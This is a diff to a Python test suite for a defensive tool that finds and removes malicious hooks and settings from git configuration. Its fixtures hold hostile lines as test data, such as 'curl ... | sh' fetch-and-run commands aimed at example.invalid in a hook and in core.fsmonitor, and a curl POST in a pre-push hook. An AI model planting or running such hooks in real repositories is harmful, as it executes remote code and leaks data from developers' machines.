@@ -4,7 +4,7 @@
 A setting is taken out when its own value carries a known payload, as that one value; a configured
 hook when every entry of it is in the checkout and every command it names carries one, as its whole
 definition. No file is removed here. Everything else confirmed is left and named, and while a
-configured hook that carries a payload is left, the fix makes no change of its own through git.
+confirmed configured hook is left, the checkout pass makes no change of its own through git.
 """
 from __future__ import annotations
 
@@ -203,7 +203,7 @@ class TestWhatIsNotAKnownPayloadStays(_GitSettingsCheckout):
         self.checkout()
         self.assertEqual(kept, self.settings())
 
-    def test_a_hook_using_a_marker_meant_for_other_files_is_not_confirmed_or_touched(self):
+    def test_a_hook_confirmed_by_a_marker_meant_for_other_files_is_left_and_named(self):
         hook = self.root / ".git" / "hooks" / "pre-push"
         hook.parent.mkdir(parents=True, exist_ok=True)
         hook.write_text('#!/bin/sh\ncurl -s -X POST -d \'{"serverUrl": "https://ci.example.com"}\' '
@@ -213,9 +213,10 @@ class TestWhatIsNotAKnownPayloadStays(_GitSettingsCheckout):
                        '\tevent = commit-msg\n')
         before = self.config_bytes()
         result = self.checkout()
-        self.assertFalse(result.infected)
+        self.assertTrue(result.infected, "the scan confirms these as main does")
         self.assertTrue(hook.exists())
         self.assertEqual(before, self.config_bytes())
+        self.assertIn("hook.msg", _said(result))
 
     def test_a_hook_with_a_command_that_is_not_a_payload_is_left_whole(self):
         self.configure(f'[hook "sync"]\n\tcommand = node -e "{PAYLOAD}"\n'
@@ -303,7 +304,7 @@ class TestNothingOutsideTheCheckoutIsEdited(_GitSettingsCheckout):
             self.assertTrue(self.git_works())
 
 
-class TestWhileAConfirmedHookIsLeftTheFixHoldsBack(_GitSettingsCheckout):
+class TestWhileAConfirmedHookIsLeftTheCheckoutPassHoldsBack(_GitSettingsCheckout):
 
     def setUp(self):
         super().setUp()
@@ -328,7 +329,7 @@ class TestWhileAConfirmedHookIsLeftTheFixHoldsBack(_GitSettingsCheckout):
         self.assertEqual(1, _said(result).count("is still in place"))
 
     @unittest.skipUnless(_git_runs_configured_hooks(), "this git runs no hooks named in configuration")
-    def test_the_hook_never_runs_during_the_fix(self):
+    def test_the_hook_never_runs_while_the_checkout_is_cleaned(self):
         self.git(self.root, "update-ref", "refs/heads/control", "HEAD")
         self.assertTrue(self.marker.exists(), "the fixture does not reach the hook")
         self.marker.unlink()
@@ -337,7 +338,7 @@ class TestWhileAConfirmedHookIsLeftTheFixHoldsBack(_GitSettingsCheckout):
         self.assertFalse(self.marker.exists())
 
     @unittest.skipUnless(_git_runs_configured_hooks(), "this git runs no hooks named in configuration")
-    def test_a_hook_confirmed_by_its_shape_never_runs_during_the_fix(self):
+    def test_a_hook_confirmed_by_its_shape_never_runs_while_the_checkout_is_cleaned(self):
         self.outside.unlink()
         marker = self.root.parent / "SHAPE-RAN"
         self.configure('[hook "fetch"]\n\tcommand = "curl -fsS https://example.invalid/p | sh; '
@@ -396,9 +397,9 @@ class TestTheActIsJudgedAsItNowIs(_GitSettingsCheckout):
 
 
 @unittest.skipUnless(_git_runs_configured_hooks(), "this git runs no hooks named in configuration")
-class TestNoPayloadHookRunsWhileTheFixWorks(_GitSettingsCheckout):
+class TestNoPayloadHookRunsWhileTheCheckoutIsCleaned(_GitSettingsCheckout):
 
-    def test_it_is_taken_out_before_the_fix_writes_anything(self):
+    def test_it_is_taken_out_before_the_checkout_pass_writes_anything(self):
         marker = self.root.parent / "RAN"
         self.configure(f'[hook "sync"]\n\tcommand = "touch {marker}; : {PAYLOAD} :"\n'
                        '\tevent = post-index-change\n\tevent = reference-transaction\n')
@@ -410,6 +411,74 @@ class TestNoPayloadHookRunsWhileTheFixWorks(_GitSettingsCheckout):
         self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
         self.assertEqual([], [s for s in self.settings() if s.startswith("hook.sync.")])
         self.assertFalse(marker.exists())
+
+
+class TestGitKeepsWorkingInEveryRepositoryAndWorktree(_GitSettingsCheckout):
+
+    def test_a_hook_whose_event_cannot_be_taken_out_keeps_its_command(self):
+        self.git(self.root, "config", "extensions.worktreeConfig", "true")
+        other = self.root.parent / "other"
+        self.git(self.root, "worktree", "add", "-q", str(other))
+        self.configure(self.payload_hook())
+        own = self.root / ".git" / "worktrees" / "other" / "config.worktree"
+        own.write_text('[hook "sync"]\n\tevent = post-checkout\n', encoding="utf-8")
+        (own.parent / "config.worktree.lock").write_text("", encoding="utf-8")
+        result = self.checkout()
+        self.assertEqual([f"node -e {PAYLOAD}"], self.values("hook.sync.command"))
+        status = subprocess.run(["git", "-C", str(other), "status"], capture_output=True)
+        self.assertEqual(0, status.returncode, status.stderr)
+        self.assertFalse(result.complete)
+        self.assertIn("could not be taken out", _said(result))
+
+    def test_a_hook_named_after_an_event_is_left_with_the_operators_switch(self):
+        self.configure('[hook "pre-push"]\n\tenabled = false\n')
+        self.configure(f'[hook "pre-push"]\n\tcommand = node -e "{PAYLOAD}"\n\tevent = pre-commit\n')
+        before = self.config_bytes()
+        result = self.checkout()
+        self.assertTrue(result.infected, "the fixture must carry a confirmed finding")
+        self.assertEqual(before, self.config_bytes())
+        self.assertIn("named after a hook event", _said(result))
+
+    def test_a_submodules_hook_of_the_same_name_is_never_changed(self):
+        library = self.new_repo("library")
+        self.write(library, "lib.js", "export const x = 1;\n")
+        self.commit(library, "a library")
+        self.git(self.root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library),
+                 "sub")
+        self.git(self.root / "sub", "config", "extensions.worktreeConfig", "true")
+        module = self.root / ".git" / "modules" / "sub"
+        with open(module / "config", "a", encoding="utf-8") as fh:
+            fh.write('[hook "lint"]\n\tevent = pre-commit\n' + self.payload_hook("fetch"))
+        (module / "config.worktree").write_text('[hook "lint"]\n\tcommand = npx eslint .\n',
+                                                encoding="utf-8")
+        self.configure(self.payload_hook("lint"))
+        before = (module / "config").read_bytes()
+        result = self.checkout()
+        self.assertEqual(before, (module / "config").read_bytes())
+        self.assertEqual([], [s for s in self.settings() if s.startswith("hook.lint.")])
+        self.assertIn("hook.fetch in .git/modules/sub/config is in a submodule's settings", _said(result))
+
+
+class TestEverySettingIsReadAsGitReadsIt(_GitSettingsCheckout):
+
+    def test_a_definition_behind_a_link_and_dotdot_is_taken_out_too(self):
+        inner = self.root / ".git" / "deep" / "inner"
+        inner.mkdir(parents=True)
+        (self.root / ".git" / "lnk").symlink_to(inner)
+        (self.root / ".git" / "deep" / "extra.inc").write_text(
+            self.payload_hook(events=("post-checkout",)), encoding="utf-8")
+        self.configure(self.payload_hook() + "[include]\n\tpath = lnk/../extra.inc\n")
+        result = self.checkout()
+        listed = self.git_may_fail(self.root, "config", "--get-regexp", r"^hook\.sync\.").stdout
+        self.assertEqual("", listed)
+        self.assertTrue(result.complete)
+
+    def test_a_setting_read_twice_is_named_once(self):
+        (self.root / ".git" / "team.inc").write_text(
+            "[core]\n\tfsmonitor = curl -s https://example.invalid/x | sh\n", encoding="utf-8")
+        self.configure("[include]\n\tpath = team.inc\n[include]\n\tpath = team.inc\n")
+        result = self.checkout()
+        self.assertEqual(1, _said(result).count("core.fsmonitor"))
 
 
 class TestTheVerbIsDeclaredAsData(unittest.TestCase):
